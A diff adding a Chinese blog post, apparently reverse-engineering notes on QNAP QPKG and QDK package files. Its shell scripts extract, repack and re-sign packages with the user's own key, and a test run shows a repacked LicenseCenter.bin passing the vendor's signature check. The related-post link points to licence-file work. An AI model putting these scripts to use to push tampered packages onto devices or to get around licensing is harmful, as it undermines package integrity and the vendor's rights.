+</span></span><span style="display:flex;"><span>        tar --ignore-failed-read -czf <span style="color:#963">$PREFIX</span>/qpkg.tar.gz -C <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span> data.tar.gz  package_routines  qinstall.sh  qpkg.cfg
+</span></span><span style="display:flex;"><span>        cat <span style="color:#963">$PREFIX</span>/head <span style="color:#963">$PREFIX</span>/qpkg.tar.gz &gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> -ne <span style="background-color:#fff0f0">&#34;\000&#34;</span> &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># sign</span>
+</span></span><span style="display:flex;"><span>        openssl sha1 -binary <span style="color:#963">$PREFIX</span>/qpkg.bin | openssl cms -sign  -nodetach -binary
+</span></span><span style="display:flex;"><span> -signer <span style="color:#963">$SIGN_CERT</span> -inkey <span style="color:#963">$SIGN_KEY</span> &gt; <span style="color:#963">$PREFIX</span>/qpkg.bin.sign
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># update offset</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">offset</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span>stat -c <span style="background-color:#fff0f0">&#34;%s&#34;</span> <span style="color:#963">$PREFIX</span>/qpkg.bin<span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">offset</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>offset+1<span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> -n <span style="background-color:#fff0f0">&#34;QDK_offset=</span><span style="color:#963">$offset</span><span style="background-color:#fff0f0"> &#34;</span> &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>        cat <span style="color:#963">$PREFIX</span>/qpkg.bin.sign &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>        cat <span style="color:#963">$PREFIX</span>/tail &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># update encrypt</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">fullsize</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span>stat -c <span style="background-color:#fff0f0">&#34;%s&#34;</span> <span style="color:#963">$PREFIX</span>/qpkg.bin<span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">encrypt</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>fullsize <span style="color:#333">*</span> <span style="color:#60e;font-weight:bold">3589</span> <span style="color:#333">+</span> <span style="color:#60e;font-weight:bold">1000000000</span><span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> -n <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$encrypt</span><span style="background-color:#fff0f0">&#34;</span> | dd <span style="color:#963">of</span><span style="color:#333">=</span><span style="color:#963">$PREFIX</span>/qpkg.bin <span style="color:#963">seek</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>fullsize-60<span style="color:#080;font-weight:bold">))</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> <span style="color:#963">conv</span><span style="color:#333">=</span>notrunc
+</span></span><span style="display:flex;"><span>        mv <span style="color:#963">$PREFIX</span>/qpkg.bin <span style="color:#963">$PREFIX</span>/<span style="color:#963">$QPKG</span>
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>usage<span style="color:#333">()</span> <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;Usage:&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$0</span><span style="background-color:#fff0f0"> extract foldername pkgname             extract package to foldername&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$0</span><span style="background-color:#fff0f0"> pack foldername pkgname                pack files under folder to foldername&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">exit</span> <span style="color:#60e;font-weight:bold">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">if</span> <span style="color:#333">[</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$#</span><span style="background-color:#fff0f0">&#34;</span> -eq <span style="background-color:#fff0f0">&#34;2&#34;</span> <span style="color:#333">]</span>; <span style="color:#080;font-weight:bold">then</span>
+</span></span><span style="display:flex;"><span>        usage
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#963">PREFIX</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$2</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#963">QPKG</span><span style="color:#333">=</span><span style="color:#963">$3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">case</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$1</span><span style="background-color:#fff0f0">&#34;</span> in
+</span></span><span style="display:flex;"><span>        extract<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>                extract_qpkg
+</span></span><span style="display:flex;"><span>                ;;
+</span></span><span style="display:flex;"><span>        pack<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>                pack_qpkg
+</span></span><span style="display:flex;"><span>                <span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;please find it in </span><span style="color:#963">$PREFIX</span><span style="background-color:#fff0f0">/</span><span style="color:#963">$QPKG</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span>                ;;
+</span></span><span style="display:flex;"><span>        *<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>                usage
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">esac</span>
+</span></span></code></pre></div><p>使用上面这个脚本就可以对其重新打包及签名了，找个老版本的QPKG包来测试一下</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># ./qpkg.sh extract license LicenseCenter.bin</span>
+</span></span><span style="display:flex;"><span>609+1 records in
+</span></span><span style="display:flex;"><span>609+1 records out
+</span></span><span style="display:flex;"><span><span style="color:#60e;font-weight:bold">472643</span> bytes <span style="color:#333">(</span>461.6KB<span style="color:#333">)</span> copied, 0.006043 seconds, 74.6MB/s
+</span></span><span style="display:flex;"><span>1+0 records in
+</span></span><span style="display:flex;"><span>1+0 records out
+</span></span><span style="display:flex;"><span><span style="color:#60e;font-weight:bold">776</span> bytes <span style="color:#333">(</span>776B<span style="color:#333">)</span> copied, 0.000008 seconds, 92.5MB/s
+</span></span><span style="display:flex;"><span><span style="color:#888"># ls license/</span>
+</span></span><span style="display:flex;"><span>head  qpkg_content  tail
+</span></span><span style="display:flex;"><span><span style="color:#888"># ls license/qpkg_content/</span>
+</span></span><span style="display:flex;"><span>data.tar.gz  package_routines  qinstall.sh  qpkg.cfg
+</span></span><span style="display:flex;"><span><span style="color:#888"># ./qpkg.sh pack license LicenseCenter.bin</span>
+</span></span><span style="display:flex;"><span>10+0 records in
+</span></span><span style="display:flex;"><span>10+0 records out
+</span></span><span style="display:flex;"><span><span style="color:#60e;font-weight:bold">10</span> bytes <span style="color:#333">(</span>10B<span style="color:#333">)</span> copied, 0.000132 seconds, 74.0KB/s
+</span></span><span style="display:flex;"><span>please find it in license/LicenseCenter.bin
+</span></span><span style="display:flex;"><span><span style="color:#888"># /sbin/cs_qpkg_verify.sh -f license/LicenseCenter.bin</span>
+</span></span><span style="display:flex;"><span>0:0
+</span></span></code></pre></div><p>看起来一切正常，输出的<code>0:0</code>表示签名校验通过</p>
+<h2 id="修改qdk">修改QDK</h2>
+<p>与QPKG有点不一样的是，QDK把偏移放在开头的脚本中，所以可以直接读取后分段构造</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#579">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#579"></span>
+</span></span><span style="display:flex;"><span><span style="color:#963">SIGN_CERT</span><span style="color:#333">=</span>sign.crt
+</span></span><span style="display:flex;"><span><span style="color:#963">SIGN_KEY</span><span style="color:#333">=</span>sign.key
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#963">PREFIX</span><span style="color:#333">=</span>qpkg_workspace
+</span></span><span style="display:flex;"><span><span style="color:#963">EXTRACT_PATH</span><span style="color:#333">=</span>qpkg_content
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>len_to_binary<span style="color:#333">()</span> <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">len</span><span style="color:#333">=</span><span style="color:#963">$1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">byte4</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;\\`printf &#39;x%02x&#39; </span><span style="color:#080;font-weight:bold">$((</span>len%256<span style="color:#080;font-weight:bold">))</span><span style="background-color:#fff0f0">`&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">len</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>len/256<span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">byte3</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;\\`printf &#39;x%02x&#39; </span><span style="color:#080;font-weight:bold">$((</span>len%256<span style="color:#080;font-weight:bold">))</span><span style="background-color:#fff0f0">`&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">len</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>len/256<span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">byte2</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;\\`printf &#39;x%02x&#39; </span><span style="color:#080;font-weight:bold">$((</span>len%256<span style="color:#080;font-weight:bold">))</span><span style="background-color:#fff0f0">`&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">len</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>len/256<span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">byte1</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;\\`printf &#39;x%02x&#39; </span><span style="color:#080;font-weight:bold">$((</span>len%256<span style="color:#080;font-weight:bold">))</span><span style="background-color:#fff0f0">`&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">printf</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$byte1$byte2$byte3$byte4</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get_offset<span style="color:#333">()</span> <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">offsets</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">$(</span>/bin/sed -n <span style="background-color:#fff0f0">&#39;1,/^exit 1/{
+</span></span></span><span style="display:flex;"><span><span style="background-color:#fff0f0">s/^script_len=\([0-9]*\).*$/\1/p
+</span></span></span><span style="display:flex;"><span><span style="background-color:#fff0f0">s/^offset.*script_len[^0-9]*\([0-9]*\).*$/\1/p
+</span></span></span><span style="display:flex;"><span><span style="background-color:#fff0f0">s/^offset.*offset[^0-9]*\([0-9]*\).*$/\1/p
+</span></span></span><span style="display:flex;"><span><span style="background-color:#fff0f0">/^exit 1/q
+</span></span></span><span style="display:flex;"><span><span style="background-color:#fff0f0">}&#39;</span> <span style="background-color:#fff0f0">&#34;</span><span style="background-color:#eee">${</span><span style="color:#963">QPKG</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">)</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">script_len</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span><span style="color:#007020">echo</span> <span style="color:#963">$offsets</span>|cut -f <span style="color:#60e;font-weight:bold">1</span> -d <span style="background-color:#fff0f0">&#34; &#34;</span><span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">raw_offset1</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span><span style="color:#007020">echo</span> <span style="color:#963">$offsets</span>|cut -f <span style="color:#60e;font-weight:bold">2</span> -d <span style="background-color:#fff0f0">&#34; &#34;</span><span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">raw_offset2</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span><span style="color:#007020">echo</span> <span style="color:#963">$offsets</span>|cut -f <span style="color:#60e;font-weight:bold">3</span> -d <span style="background-color:#fff0f0">&#34; &#34;</span><span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">offset1</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>script_len+raw_offset1<span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">offset2</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>offset1+raw_offset2<span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>extract_qdk<span style="color:#333">()</span> <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>        mkdir -p <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>
+</span></span><span style="display:flex;"><span>        get_offset
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> <span style="color:#963">$script_len</span> <span style="color:#963">$raw_offset1</span> <span style="color:#963">$raw_offset2</span> <span style="color:#963">$offset1</span> <span style="color:#963">$offset2</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> <span style="color:#080;font-weight:bold">$((</span><span style="color:#333">(</span>raw_offset2+1024<span style="color:#333">)/</span><span style="color:#60e;font-weight:bold">1024</span><span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>        dd <span style="color:#080;font-weight:bold">if</span><span style="color:#333">=</span><span style="color:#963">$QPKG</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#963">$script_len</span> <span style="color:#963">count</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> &gt; <span style="color:#963">$PREFIX</span>/head
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">if</span> grep data.tar.7z  <span style="color:#963">$PREFIX</span>/head &gt;/dev/null; <span style="color:#080;font-weight:bold">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#963">is7z</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">fi</span>
+</span></span><span style="display:flex;"><span>        dd <span style="color:#080;font-weight:bold">if</span><span style="color:#333">=</span><span style="color:#963">$QPKG</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#963">$script_len</span> <span style="color:#963">skip</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> |/bin/tar -xO | /bin/tar -xzv -C  <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>
+</span></span><span style="display:flex;"><span>        dd <span style="color:#080;font-weight:bold">if</span><span style="color:#333">=</span><span style="color:#963">$QPKG</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#963">$offset1</span> <span style="color:#963">skip</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> | /bin/cat | /bin/dd <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1024</span> <span style="color:#963">of</span><span style="color:#333">=</span><span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data.tar.gz
+</span></span><span style="display:flex;"><span>        truncate -s <span style="color:#963">$raw_offset2</span> <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data.tar.gz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        mkdir <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">if</span> <span style="color:#333">[</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$is7z</span><span style="background-color:#fff0f0">&#34;</span> <span style="color:#333">==</span> <span style="background-color:#fff0f0">&#34;1&#34;</span> <span style="color:#333">]</span>; <span style="color:#080;font-weight:bold">then</span>
+</span></span><span style="display:flex;"><span>                mv <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data.tar.gz <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data.tar.7z
+</span></span><span style="display:flex;"><span>                7z x -so <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data.tar.7z | tar x -C <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">else</span>
+</span></span><span style="display:flex;"><span>                tar xf <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data.tar.gz -C <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        tail -c <span style="color:#60e;font-weight:bold">100</span> <span style="color:#963">$QPKG</span>&gt; <span style="color:#963">$PREFIX</span>/tail
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pack_qdk<span style="color:#333">()</span> <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888"># control.tar.gz</span>
+</span></span><span style="display:flex;"><span>        tar czf <span style="color:#963">$PREFIX</span>/control.tar.gz -C <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span> build_info package_routines  qinstall.sh  qpkg.cfg
+</span></span><span style="display:flex;"><span>        tar cf <span style="color:#963">$PREFIX</span>/control.tar -C <span style="color:#963">$PREFIX</span> control.tar.gz
+</span></span><span style="display:flex;"><span>        <span style="color:#963">new_offset1</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span>stat -c <span style="background-color:#fff0f0">&#34;%s&#34;</span> <span style="color:#963">$PREFIX</span>/control.tar<span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">new_offset2</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span>stat -c <span style="background-color:#fff0f0">&#34;%s&#34;</span> <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data.tar.gz<span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># update control.tar offset</span>
+</span></span><span style="display:flex;"><span>        sed -i <span style="background-color:#fff0f0">&#34;s/^\(.*script_len \+ \)</span><span style="color:#963">$raw_offset1</span><span style="background-color:#fff0f0">\(.*\)\$/\1</span><span style="color:#963">$new_offset1</span><span style="background-color:#fff0f0">\2/g&#34;</span> <span style="color:#963">$PREFIX</span>/head
+</span></span><span style="display:flex;"><span><span style="color:#888"># update data.tar.gz offset</span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># assume the longest number will not expect confict.</span>
+</span></span><span style="display:flex;"><span>        sed -i <span style="background-color:#fff0f0">&#34;s/^\(.*\)</span><span style="color:#963">$raw_offset2</span><span style="background-color:#fff0f0">\(.*\)\$/\1</span><span style="color:#963">$new_offset2</span><span style="background-color:#fff0f0">\2/g&#34;</span> <span style="color:#963">$PREFIX</span>/head
+</span></span><span style="display:flex;"><span><span style="color:#888"># update /bin/dd bs=1024 count=</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">bcount</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span><span style="color:#333">(</span>new_offset2+1024<span style="color:#333">)/</span><span style="color:#60e;font-weight:bold">1024</span><span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>        sed -i <span style="background-color:#fff0f0">&#34;s/^\(.*bs=1024 count=\)[0-9]*\(.*\)\$/\1</span><span style="color:#963">$bcount</span><span style="background-color:#fff0f0">\2/g&#34;</span> <span style="color:#963">$PREFIX</span>/head
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># update script_len</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">script_len</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span>stat -c <span style="background-color:#fff0f0">&#34;%s&#34;</span> <span style="color:#963">$PREFIX</span>/head<span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        sed -i <span style="background-color:#fff0f0">&#34;s/^script_len=.*\$/script_len=</span><span style="color:#963">$script_len</span><span style="background-color:#fff0f0">/g&#34;</span> <span style="color:#963">$PREFIX</span>/head
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># assemble</span>
+</span></span><span style="display:flex;"><span>        cat <span style="color:#963">$PREFIX</span>/head <span style="color:#963">$PREFIX</span>/control.tar <span style="color:#963">$PREFIX</span>/<span style="color:#963">$EXTRACT_PATH</span>/data.tar.gz &gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># sign</span>
+</span></span><span style="display:flex;"><span>        openssl sha1 -binary <span style="color:#963">$PREFIX</span>/qpkg.bin | openssl cms -sign  -nodetach -binary
+</span></span><span style="display:flex;"><span> -signer <span style="color:#963">$SIGN_CERT</span> -inkey <span style="color:#963">$SIGN_KEY</span> &gt; <span style="color:#963">$PREFIX</span>/qpkg.bin.sign
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#888"># tail</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">sign_len</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span>stat -c <span style="background-color:#fff0f0">&#34;%s&#34;</span> <span style="color:#963">$PREFIX</span>/qpkg.bin.sign<span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> -n <span style="background-color:#fff0f0">&#34;QDK&#34;</span> &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">printf</span> <span style="background-color:#fff0f0">&#34;\xFE&#34;</span> &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>        len_to_binary <span style="color:#963">$sign_len</span> &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>        cat <span style="color:#963">$PREFIX</span>/qpkg.bin.sign &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">printf</span> <span style="background-color:#fff0f0">&#34;\xFF&#34;</span> &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span>        cat <span style="color:#963">$PREFIX</span>/tail &gt;&gt; <span style="color:#963">$PREFIX</span>/qpkg.bin
+</span></span><span style="display:flex;"><span> <span style="color:#888"># update encrypt</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">fullsize</span><span style="color:#333">=</span><span style="background-color:#fff0f0">`</span>stat -c <span style="background-color:#fff0f0">&#34;%s&#34;</span> <span style="color:#963">$PREFIX</span>/qpkg.bin<span style="background-color:#fff0f0">`</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">encrypt</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>fullsize <span style="color:#333">*</span> <span style="color:#60e;font-weight:bold">3589</span> <span style="color:#333">+</span> <span style="color:#60e;font-weight:bold">1000000000</span><span style="color:#080;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> -n <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$encrypt</span><span style="background-color:#fff0f0">&#34;</span> | dd <span style="color:#963">of</span><span style="color:#333">=</span><span style="color:#963">$PREFIX</span>/qpkg.bin <span style="color:#963">seek</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$((</span>fullsize-60<span style="color:#080;font-weight:bold">))</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> <span style="color:#963">conv</span><span style="color:#333">=</span>notrunc
+</span></span><span style="display:flex;"><span>        mv <span style="color:#963">$PREFIX</span>/qpkg.bin <span style="color:#963">$PREFIX</span>/<span style="color:#963">$QPKG</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>usage<span style="color:#333">()</span> <span style="color:#333">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;Usage:&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$0</span><span style="background-color:#fff0f0"> extract foldername pkgname             extract package to foldername&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$0</span><span style="background-color:#fff0f0"> pack foldername pkgname                pack files under folder to foldername&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007020">exit</span> <span style="color:#60e;font-weight:bold">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#333">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">if</span> <span style="color:#333">[</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$#</span><span style="background-color:#fff0f0">&#34;</span> -eq <span style="background-color:#fff0f0">&#34;2&#34;</span> <span style="color:#333">]</span>; <span style="color:#080;font-weight:bold">then</span>
+</span></span><span style="display:flex;"><span>        usage
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#963">PREFIX</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$2</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#963">QPKG</span><span style="color:#333">=</span><span style="color:#963">$3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">case</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$1</span><span style="background-color:#fff0f0">&#34;</span> in
+</span></span><span style="display:flex;"><span>        extract<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>                extract_qdk
+</span></span><span style="display:flex;"><span>                ;;
+</span></span><span style="display:flex;"><span>        pack<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>                pack_qdk
+</span></span><span style="display:flex;"><span>                <span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;please find it in </span><span style="color:#963">$PREFIX</span><span style="background-color:#fff0f0">/</span><span style="color:#963">$QPKG</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span>                ;;
+</span></span><span style="display:flex;"><span>        *<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>                usage
+</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">esac</span>
+</span></span></code></pre></div><p>QDK的还没测试，以后有空再测试一下吧，感觉应该大概也许可以用。</p>
+
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://jxcn.org/2022/03/qnap-license/" data-tooltip="QutsCloud 逆向笔记 - qlicense设备标识文件及许可证文件" aria-label=": QutsCloud 逆向笔记 - qlicense设备标识文件及许可证文件">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml"></span>
+            </a>
+        </li>
+        <li class="post-action">
+          
